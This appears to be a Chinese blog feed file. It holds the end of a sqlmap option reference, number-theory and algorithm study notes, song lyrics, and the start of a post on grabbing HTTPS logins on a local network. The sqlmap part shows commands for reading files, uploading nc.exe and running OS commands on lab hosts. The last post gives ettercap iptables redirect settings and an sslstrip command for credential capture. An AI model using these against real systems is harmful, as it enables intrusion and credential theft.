枚举Enumeration</font><a href="post/SQLMAP-shell#2-9-枚举Enumeration"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。   -a, \--all           获取所有信息   -b, \--banner        获取数据库管理系统的标识   \--current-user      获取数据库管理系统当前用户   \--current-db        获取数据库管理系统当前数据库   \--hostname         获取数据库服务器的主机名称   \--is-dba            检测DBMS当前用户是否DBA   \--users             枚举数据库管理系统用户   \--passwords         枚举数据库管理系统用户密码哈希   \--privileges        枚举数据库管理系统用户的权限   \--roles            枚举数据库管理系统用户的角色   \--dbs             枚举数据库管理系统数据库   \--tables            枚举的DBMS数据库中的表   \--columns          枚举DBMS数据库表列   \--schema            枚举数据库架构   \--count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url --count -D testdb   \--dump            转储数据库表项   \--dump-all          转储数据库所有表项   \--search           搜索列（S），表（S）和/或数据库名称（S）   \--comments          获取DBMS注释   -D DB               要进行枚举的指定数据库名   -T TBL              DBMS数据库表枚举   -C COL             DBMS数据库表列枚举   -X EXCLUDECOL     DBMS数据库表不进行枚举   -U USER           用来进行枚举的数据库用户   \--exclude-sysdbs    枚举表时排除系统数据库   \--pivot-column=P..  Pivot columnname   \--where=DUMPWHERE   Use WHEREcondition while table dumping   \--start=LIMITSTART  获取第一个查询输出数据位置   \--stop=LIMITSTOP   获取最后查询的输出数据   \--first=FIRSTCHAR   第一个查询输出字的字符获取   \--last=LASTCHAR    最后查询的输出字字符获取   \--sql-query=QUERY   要执行的SQL语句   \--sql-shell         提示交互式SQL的shell   \--sql-file=SQLFILE  要执行的SQL文件</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-10-暴力Brute-force"><font face="楷体" color="#FF6347">2.10 暴力Brute force</font><a href="post/SQLMAP-shell#2-10-暴力Brute-force"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可以被用来运行暴力检查   \--common-tables     检查存在共同表   \--common-columns    检查存在共同列</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-11-用户自定义函数注入User-defined-function-injection"><font face="楷体" color="#FF6347">2.11 用户自定义函数注入User-defined function injection</font><a href="post/SQLMAP-shell#2-11-用户自定义函数注入User-defined-function-injection"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可以用来创建用户自定义函数   \--udf-inject    注入用户自定义函数   \--shared-lib=SHLIB  共享库的本地路径</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-12-访问文件系统File-system-access"><font face="楷体" color="#FF6347">2.12 访问文件系统File system access</font><a href="post/SQLMAP-shell#2-12-访问文件系统File-system-access"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可以被用来访问后端数据库管理系统的底层文件系统   \--file-read=RFILE   从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe:sqlmap.py -u”http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther“\--file-read “C:/example.exe” -v 1   \--file-write=WFILE  编辑后端的数据库管理系统文件系统上的本地文件   \--file-dest=DFILE   后端的数据库管理系统写入文件的绝对路径在kali中将/software/nc.exe文件上传到C:/WINDOWS/Temp下：python sqlmap.py -u”http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1” \--file-write”/software/nc.exe” \--file-dest “C:/WINDOWS/Temp/nc.exe” -v1</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-13-操作系统访问Operating-system-access"><font face="楷体" color="#FF6347">2.13 操作系统访问Operating system access</font><a href="post/SQLMAP-shell#2-13-操作系统访问Operating-system-access"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可以用于访问后端数据库管理系统的底层操作系统   \--os-cmd=OSCMD   执行操作系统命令（OSCMD）   \--os-shell          交互式的操作系统的shell   \--os-pwn          获取一个OOB shell，meterpreter或VNC   \--os-smbrelay       一键获取一个OOBshell，meterpreter或VNC   \--os-bof           存储过程缓冲区溢出利用   \--priv-esc          数据库进程用户权限提升   \--msf-path=MSFPATH  MetasploitFramework本地的安装路径   \--tmp-path=TMPPATH  远程临时文件目录的绝对路径linux查看当前用户命令：sqlmap.py -u”http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1” \--os-cmd id -v1</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-14-Windows注册表访问Windows-registry-access"><font face="楷体" color="#FF6347">2.14 Windows注册表访问Windows registry access</font><a href="post/SQLMAP-shell#2-14-Windows注册表访问Windows-registry-access"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可以被用来访问后端数据库管理系统Windows注册表   \--reg-read          读一个Windows注册表项值   \--reg-add           写一个Windows注册表项值数据   \--reg-del           删除Windows注册表键值   \--reg-key=REGKEY    Windows注册表键   \--reg-value=REGVAL  Windows注册表项值   \--reg-data=REGDATA  Windows注册表键值数据   \--reg-type=REGTYPE  Windows注册表项值类型</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-15-一般选项General"><font face="楷体" color="#FF6347">2.15 一般选项General</font><a href="post/SQLMAP-shell#2-15-一般选项General"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">这些选项可以用来设置一些一般的工作参数   -s SESSIONFILE     保存和恢复检索会话文件的所有数据   -t TRAFFICFILE      记录所有HTTP流量到一个文本文件中   \--batch            从不询问用户输入，使用所有默认配置。   \--binary-fields=..  结果字段具有二进制值(e.g.”digest”)   \--charset=CHARSET   强制字符编码   \--crawl=CRAWLDEPTH  从目标URL爬行网站   \--crawl-exclude=..  正则表达式从爬行页中排除   \--csv-del=CSVDEL    限定使用CSV输出 (default”,”)   \--dump-format=DU..  转储数据格式(CSV(default), HTML or SQLITE)   \--eta              显示每个输出的预计到达时间   \--flush-session     刷新当前目标的会话文件   \--forms           解析和测试目标URL表单   \--fresh-queries     忽略在会话文件中存储的查询结果   \--hex             使用DBMS Hex函数数据检索   \--output-dir=OUT..  自定义输出目录路径   \--parse-errors      解析和显示响应数据库错误信息   \--save=SAVECONFIG   保存选项到INI配置文件   \--scope=SCOPE    从提供的代理日志中使用正则表达式过滤目标   \--test-filter=TE..  选择测试的有效载荷和/或标题(e.g. ROW)   \--test-skip=TEST..  跳过试验载荷和/或标题(e.g.BENCHMARK)   \--update            更新sqlmap</font></td></tr></table></div></div><p>&nbsp;</p><h5 id="2-16-杂项Miscellaneous"><font face="楷体" color="#FF6347">2.16 杂项Miscellaneous</font><a href="post/SQLMAP-shell#2-16-杂项Miscellaneous"></a></h5><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#F0FFF0"><font face="楷体">   -z MNEMONICS        使用短记忆法 (e.g.”flu,bat,ban,tec=EU”)   \--alert=ALERT       发现SQL注入时，运行主机操作系统命令   \--answers=ANSWERS   当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit=N,follow=N”)，例如：sqlmap.py -u”http://192.168.22.128/get_int.php?id=1“–technique=E\--answers=”extending=N” \--batch   \--beep    发现sql注入时，发出蜂鸣声。   \--cleanup     清除sqlmap注入时在DBMS中产生的udf与表。   \--dependencies      Check formissing (non-core) sqlmap dependencies   \--disable-coloring  默认彩色输出，禁掉彩色输出。   \--gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试   \--identify-waf      进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别   \--mobile     有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。   \--offline           Work inoffline mode (only use session data)   \--purge-output     从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。   \--skip-waf           跳过WAF／IPS / IDS启发式检测保护   \--smart            进行积极的启发式测试，快速判断为注入的报错点进行注入   \--sqlmap-shell      互动提示一个sqlmapshell   \--tmp-dir=TMPDIR    用于存储临时文件的本地目录   \--web-root=WEBROOT  Web服务器的文档根目录(e.g.”/var/www”)   \--wizard   新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入</font></td></tr></table></div></div>]]></content>
      
      
      <categories>
          
          <category> Kali-SQLMAP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLMAP命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全数学基础复习笔记</title>
      <link href="/post/Mathematical-basis/"/>
      <url>/post/Mathematical-basis/</url>
      
        <content type="html"><![CDATA[<p>&nbsp;<font face="楷体">12.3复习笔记</font></p><h4 id="第一章、整数的可除性"><font face="楷体">第一章、整数的可除性</font><a href="post/Mathematical-basis#第一章、整数的可除性"></a></h4><h5 id="1-1-整数的概念、欧几里得除法"><font face="楷体">1.1 整数的概念、欧几里得除法</font><a href="post/Mathematical-basis#1-1-整数的概念、欧几里得除法"></a></h5><p><a href="https://s1.ax1x.com/2018/12/03/FM6Bwj.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/03/FM6Bwj.jpg" alt="1"></a><br><a href="https://s1.ax1x.com/2018/12/03/FM6hm4.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/03/FM6hm4.jpg" alt="2"></a><br>&nbsp;</p><h5 id="1-2-最大公因数与广义欧几里得除法"><font face="楷体">1.2 最大公因数与广义欧几里得除法</font><a href="post/Mathematical-basis#1-2-最大公因数与广义欧几里得除法"></a></h5><p><a href="https://s1.ax1x.com/2018/12/03/FM6v0H.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/03/FM6v0H.jpg" alt="3"></a><br><a href="https://s1.ax1x.com/2018/12/03/FMcSAA.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/03/FMcSAA.jpg" alt="4"></a><br>&nbsp;</p><h5 id="1-3-整除的进一步性质及最小公倍数"><font face="楷体">1.3 整除的进一步性质及最小公倍数</font><a href="post/Mathematical-basis#1-3-整除的进一步性质及最小公倍数"></a></h5><h5 id="1-4-整数分解"><font face="楷体">1.4 整数分解</font><a href="post/Mathematical-basis#1-4-整数分解"></a></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMcFc8.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/03/FMcFc8.jpg" alt="5"></a><br>&nbsp;</p><h5 id="1-5-素数的算术基本定理"><font face="楷体">1.5 素数的算术基本定理</font><a href="post/Mathematical-basis#1-5-素数的算术基本定理"></a></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMc8uF.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/03/FMc8uF.jpg" alt="6"></a></p><p>&nbsp;<br>&nbsp;</p><h4 id="第二章、同余"><font face="楷体">第二章、同余</font><a href="post/Mathematical-basis#第二章、同余"></a></h4><h5 id="2-1-同余的概念及基本性质"><font face="楷体">2.1 同余的概念及基本性质</font><a href="post/Mathematical-basis#2-1-同余的概念及基本性质"></a></h5><p><a href="https://s1.ax1x.com/2018/12/03/FMcIKS.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/03/FMcIKS.jpg" alt="7"></a><br><a href="https://s1.ax1x.com/2018/12/03/FMcTbQ.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/03/FMcTbQ.jpg" alt="8"></a><br>&nbsp;</p><h5 id="2-2-剩余类及完全剩余系"><font face="楷体">2.2 剩余类及完全剩余系</font><a href="post/Mathematical-basis#2-2-剩余类及完全剩余系"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8N4wn.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8N4wn.jpg" alt="9"></a><br>&nbsp;</p><h5 id="2-3-简化剩余系与欧拉函数"><font face="楷体">2.3 简化剩余系与欧拉函数</font><a href="post/Mathematical-basis#2-3-简化剩余系与欧拉函数"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8N7WT.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8N7WT.jpg" alt="10"></a><br>&nbsp;</p><h5 id="2-4-欧拉定理、费马小定理、Wilson定理"><font face="楷体">2.4 欧拉定理、费马小定理、Wilson定理</font><a href="post/Mathematical-basis#2-4-欧拉定理、费马小定理、Wilson定理"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Njm9.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8Njm9.jpg" alt="11"></a><br>&nbsp;</p><h5 id="2-5-模重复平方算法"><font face="楷体">2.5 模重复平方算法</font><a href="post/Mathematical-basis#2-5-模重复平方算法"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8NxT1.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8NxT1.jpg" alt="12"></a></p><p>&nbsp;<br>&nbsp;<br><font face="楷体">12.5复习笔记</font></p><h4 id="第三章、同余式"><font face="楷体">第三章、同余式</font><a href="post/Mathematical-basis#第三章、同余式"></a></h4><h5 id="3-1-基本概念及一次同余式"><font face="楷体">3.1 基本概念及一次同余式</font><a href="post/Mathematical-basis#3-1-基本概念及一次同余式"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UpY6.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8UpY6.jpg" alt="13"></a><br>&nbsp;</p><h5 id="3-2-中国剩余定理"><font face="楷体">3.2 中国剩余定理</font><a href="post/Mathematical-basis#3-2-中国剩余定理"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UF6e.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8UF6e.jpg" alt="14"></a><br>&nbsp;</p><h5 id="3-3-高次同余式的解法及解数"><font face="楷体">3.3 高次同余式的解法及解数</font><a href="post/Mathematical-basis#3-3-高次同余式的解法及解数"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UV0A.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8UV0A.jpg" alt="15"></a><br>&nbsp;</p><h5 id="3-4-素数模的同余式"><font face="楷体">3.4 素数模的同余式</font><a href="post/Mathematical-basis#3-4-素数模的同余式"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Utkq.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8Utkq.jpg" alt="16"></a></p><p>&nbsp;<br>&nbsp;</p><h4 id="第四章、二次同余式与平方剩余"><font face="楷体">第四章、二次同余式与平方剩余</font><a href="post/Mathematical-basis#第四章、二次同余式与平方剩余"></a></h4><h5 id="4-1-一般二次同余式"><font face="楷体">4.1 一般二次同余式</font><a href="post/Mathematical-basis#4-1-一般二次同余式"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UBX4.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8UBX4.jpg" alt="17"></a><br>&nbsp;</p><h5 id="4-2-模为奇素数的平方剩余与平方剩余"><font face="楷体">4.2 模为奇素数的平方剩余与平方剩余</font><a href="post/Mathematical-basis#4-2-模为奇素数的平方剩余与平方剩余"></a></h5><h5 id="4-3-勒让得符号"><font face="楷体">4.3 勒让得符号</font><a href="post/Mathematical-basis#4-3-勒让得符号"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8Uy7R.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8Uy7R.jpg" alt="18"></a><br>&nbsp;</p><h5 id="4-4-二次互反律"><font face="楷体">4.4 二次互反律</font><a href="post/Mathematical-basis#4-4-二次互反律"></a></h5><h5 id="4-5-雅可比符号"><font face="楷体">4.5 雅可比符号</font><a href="post/Mathematical-basis#4-5-雅可比符号"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UjgS.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8UjgS.jpg" alt="19"></a></p><p>&nbsp;<br>&nbsp;</p><h4 id="第五章、原根与指标"><font face="楷体">第五章、原根与指标</font><a href="post/Mathematical-basis#第五章、原根与指标"></a></h4><h5 id="5-1-指数及基本性质"><font face="楷体">5.1 指数及基本性质</font><a href="post/Mathematical-basis#5-1-指数及基本性质"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8UzuQ.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8UzuQ.jpg" alt="20"></a><br><a href="https://s1.ax1x.com/2018/12/09/F8apHs.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8apHs.jpg" alt="21"></a><br>&nbsp;</p><h5 id="5-2-原根"><font face="楷体">5.2 原根</font><a href="post/Mathematical-basis#5-2-原根"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8anb9.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8anb9.jpg" alt="22"></a><br>&nbsp;</p><h5 id="5-3-指标及n次同余式"><font face="楷体">5.3 指标及n次同余式</font><a href="post/Mathematical-basis#5-3-指标及n次同余式"></a></h5><p><a href="https://s1.ax1x.com/2018/12/09/F8a38K.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/09/F8a38K.jpg" alt="23"></a><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信安数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Music-Collection</title>
      <link href="/post/Music-Collection/"/>
      <url>/post/Music-Collection/</url>
      
        <content type="html"><![CDATA[<p>&nbsp;</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="730" height="550" src="//music.163.com/outchain/player?type=0&id=692893521&auto=0&height=500"></iframe><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="730" height="450" src="//music.163.com/outchain/player?type=0&id=2197936899&auto=0&height=430"></iframe><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="730" height="450" src="//music.163.com/outchain/player?type=0&id=2527477789&auto=0&height=430"></iframe>]]></content>
      
      
      <categories>
          
          <category> 音乐 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PVRIS-OnlyLove</title>
      <link href="/post/PVRIS-OnlyLove/"/>
      <url>/post/PVRIS-OnlyLove/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=28475345&auto=0&height=66"></iframe><center>I'm hoping you weren't heaven sent我一直祈盼你并非天赐Cause only hell knows where you've been鬼才知道你的行踪Your built composure's wearing thin你佯装的镇定愈来愈单薄了And all your walls are caving in你的壁垒也渐渐塌陷Before you shut this down在你喊停之前I just wanna lift you up我只是想撑起你I'll take all this love I found我会收藏好我拾到的爱恋And I hope that it's enough这就够了I saw you, yeah you,我看见你了 是你you're breaking down逐渐崩溃的你I hope you, yeah you,我希望你 是你you come around回到我身边的你Now don't you shut this down我不准你现在喊停ooh no don't you give this up不准你现在放手I took all this love I found我收好了我拾到的爱恋and I hope that it's enough我多想就这样满足Is it enough?但足矣吗If we don't bend then this might break若我们不让步 这一切都将毁灭Please don't give into this pain求你了 不要陷入这般痛苦Just keep on counting down the days只要数着日子And dream of me to keep you safe梦着我 就让你安稳Don't you shut this down不准你喊停No, don't you give this up不准你放手I took all this love I found我收好了我拾到的爱恋and I hope that it's enough我多想就这样满足I saw you, yeah you,我看见你了 是你you're breaking down逐渐崩溃的你I hope you, yeah you,我希望你 是你you come around回到我身边的你Now don't you shut this down我不准你现在喊停oh no don't you give this up不准你现在放手I took all this love I found我收好了我拾到的爱恋and I hope that it's enough我多想就这样满足Is it enough?但足矣吗Don't you shut this down不准你喊停Don't you give this up不准你放手Don't you shut this down不准你喊停Don't you give this up不准你放手Before you came around在你回来之前I was lost and out of place我失去了自我 不知所以You're the only love I found你是我好不容易找到的挚爱and I'm hoping that you'll stay所以我期望你能留下来Please stay所以留下来吧Please stay请你留下来吧Please stay求你留下来吧</center>]]></content>
      
      
      <categories>
          
          <category> 音乐 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>杨宗纬-《空白格》专辑</title>
      <link href="/post/%E6%9D%A8%E5%AE%97%E7%BA%AC-%E3%80%8A%E7%A9%BA%E7%99%BD%E6%A0%BC%E3%80%8B%E4%B8%93%E8%BE%91/"/>
      <url>/post/%E6%9D%A8%E5%AE%97%E7%BA%AC-%E3%80%8A%E7%A9%BA%E7%99%BD%E6%A0%BC%E3%80%8B%E4%B8%93%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="110" src="//music.163.com/outchain/player?type=1&id=3044089&auto=0&height=90"></iframe><center><font face="楷体">作曲 : 蔡健雅作词 : 蔡健雅其实很简单其实很自然两个人的爱由两人分担其实并不难是你太悲观隔着一道墙不跟谁分享不想让你为难你不再需要给我个答案我想你是爱我的我猜你也舍不得但是怎么说总觉得我们之间留了太多空白格也许你不是我的爱你却又该割舍分开或许是选择但它也可能是我们的缘分我想你是爱我的我猜你也舍不得但是怎么说总觉得我们之间留了太多空白格也许你不是我的爱你却又该割舍分开或许是选择但它也可能是我们的缘分但它也可能是我们的缘分</font><p>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p></center>]]></content>
      
      
      <categories>
          
          <category> 音乐 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全复习笔记</title>
      <link href="/post/Network-security/"/>
      <url>/post/Network-security/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全笔记 </tag>
            
            <tag> 安全指导 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法复习笔记</title>
      <link href="/post/algorithm/"/>
      <url>/post/algorithm/</url>
      
        <content type="html"><![CDATA[<p>&nbsp;<font face="楷体">11.19复习笔记</font></p><h3 id="二、递归与分治策略"><font face="楷体">二、递归与分治策略</font><a href="post/algorithm#二、递归与分治策略"></a></h3><h4 id="1-递归与分治"><font face="楷体">(1)递归与分治</font><a href="post/algorithm#1-递归与分治"></a></h4><p><a href="https://s1.ax1x.com/2018/11/19/FpNSaQ.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/19/FpNSaQ.jpg" alt="1"></a><br><a href="https://s1.ax1x.com/2018/11/19/FpNp5j.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/19/FpNp5j.jpg" alt="2"></a></p><h4 id="2-二分搜索技术"><font face="楷体">(2)二分搜索技术</font><a href="post/algorithm#2-二分搜索技术"></a></h4><p><a href="https://s1.ax1x.com/2018/11/19/FpNCPs.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/19/FpNCPs.jpg" alt="3"></a></p><h4 id="3-线性时间选择、最接近点对"><font face="楷体">(3)线性时间选择、最接近点对</font><a href="post/algorithm#3-线性时间选择、最接近点对"></a></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2eBt.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FV2eBt.jpg" alt="3"></a><br>&nbsp;<br>&nbsp;<br><font face="楷体">11.20复习笔记</font></p><h3 id="三、动态规划"><font face="楷体">三、动态规划</font><a href="post/algorithm#三、动态规划"></a></h3><h4 id="1-矩阵连乘"><font face="楷体">(1)矩阵连乘</font><a href="post/algorithm#1-矩阵连乘"></a></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV23cj.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FV23cj.jpg" alt="4"></a></p><h4 id="2-最长公共子序列"><font face="楷体">(2)最长公共子序列</font><a href="post/algorithm#2-最长公共子序列"></a></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2UEV.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FV2UEV.jpg" alt="5"></a></p><h4 id="3-最长子段和、凸多边形、图像压缩"><font face="楷体">(3)最长子段和、凸多边形、图像压缩</font><a href="post/algorithm#3-最长子段和、凸多边形、图像压缩"></a></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2B34.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FV2B34.jpg" alt="6"></a></p><h4 id="4-电路布线"><font face="楷体">(4)电路布线</font><a href="post/algorithm#4-电路布线"></a></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2yuR.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FV2yuR.jpg" alt="7"></a></p><h4 id="5-流水作业调度、0-1背包"><font face="楷体">(5)流水作业调度、0-1背包</font><a href="post/algorithm#5-流水作业调度、0-1背包"></a></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV22E6.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FV22E6.jpg" alt="8"></a><br>&nbsp;<br>&nbsp;<br><font face="楷体">11.21复习笔记</font></p><h3 id="四、贪心算法"><font face="楷体">四、贪心算法</font><a href="post/algorithm#四、贪心算法"></a></h3><h4 id="1-活动安排、背包问题"><font face="楷体">(1)活动安排、背包问题</font><a href="post/algorithm#1-活动安排、背包问题"></a></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV25gH.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FV25gH.jpg" alt="9"></a></p><h4 id="2-最优装载、哈夫曼编码、单源最短路径"><font face="楷体">(2)最优装载、哈夫曼编码、单源最短路径</font><a href="post/algorithm#2-最优装载、哈夫曼编码、单源最短路径"></a></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2LUf.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FV2LUf.jpg" alt="10"></a></p><h4 id="3-最小生成树"><font face="楷体">(3)最小生成树</font><a href="post/algorithm#3-最小生成树"></a></h4><p><a href="https://s1.ax1x.com/2018/11/28/FV2jPS.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FV2jPS.jpg" alt="11"></a></p><h4 id="4-多机调度问题"><font face="楷体">(4)多机调度问题</font><a href="post/algorithm#4-多机调度问题"></a></h4><p><a href="https://s1.ax1x.com/2018/11/28/FVRurR.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FVRurR.jpg" alt="12"></a></p><h3 id="五、回溯法"><font face="楷体">五、回溯法</font><a href="post/algorithm#五、回溯法"></a></h3><p><a href="https://s1.ax1x.com/2018/11/28/FVR1IK.jpg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/28/FVR1IK.jpg" alt="13"></a></p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网称霸之《HTTPS账号密码获取》</title>
      <link href="/post/HTTPS-password/"/>
      <url>/post/HTTPS-password/</url>
      
        <content type="html"><![CDATA[<p>⭐<strong>使用工具：arpspoof、ettercap、sslstrip</strong></p><h4 id="一、将HTTPS转换成HTTP">一、将HTTPS转换成HTTP<a href="post/HTTPS-password#一、将HTTPS转换成HTTP"></a></h4><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#D1EEEE">在获取HTTPS账号、密码的操作前需要修改ettercap的设置，否则无法成功。1.先编辑/etc/ettercap/etter.conf下的文件内容，更改ettercap设置；1.1输入/etc/ettercap/etter.conf后找到：# if you use iptables:#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"这个地方2.改为（去掉两个#）：# if you use iptables:redir_command_on = "iptables <font color="red">-t</font> nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"redir_command_off = "iptables <font color="red">-t</font> nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"3.输入sslstrip -a -f -k 实现https转换成http以获取帐号密码；4.在该终端窗口下右键选择“复制SSH渠道(S)”；5.接着直接使用HTTP账号密码获取的方法就可以了。</td></tr></table></div></div><blockquote><blockquote><p>vim使用方法：<br>编辑：按下i；<br>保存并退出：按下Esc，然后按Shift和：(冒号)，按下wq，完后按回车；<br>不保存并退出：按下Esc，然后按Shift和：(冒号)，按下q!，完后按回车；</p></blockquote></blockquote><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/ettercap/etter.confi删除两个<span class="token comment" spellcheck="true">#</span>Esc、Shift ：、wq、回车sslstrip -a -f -k<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二、ARP欺骗和抓包获取HTTPS账号和密码">二、ARP欺骗和抓包获取HTTPS账号和密码<a 